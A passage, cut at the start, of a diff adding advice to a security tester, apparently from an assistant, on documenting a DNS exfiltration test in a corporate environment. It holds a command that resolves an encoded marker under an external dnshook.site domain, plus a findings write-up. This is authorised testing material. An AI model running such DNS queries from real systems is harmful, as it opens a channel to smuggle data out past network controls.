@@ -1,0 +1,13 @@
+nd DNS queries.
+For your screenshot/evidence, I'd capture both windows if possible:
+SOE:
+whoami
+Resolve-DnsName <encoded-marker>.5114....dnshook.site
+
+Webhook.site:
+received DNS request showing the same encoded marker
+
+I would describe the outcome as:
+DNS data transfer capability: CONFIRMED. A standard user was able to generate an external DNS request containing attacker-controlled encoded data within the queried hostname, which was successfully observed by an externally controlled DNS endpoint.
+
+One nuance: this demonstrates the channel exists, not that sensitive data was actually exfiltrated. That's enough for the test; don't put any real ASIC information into the DNS label.
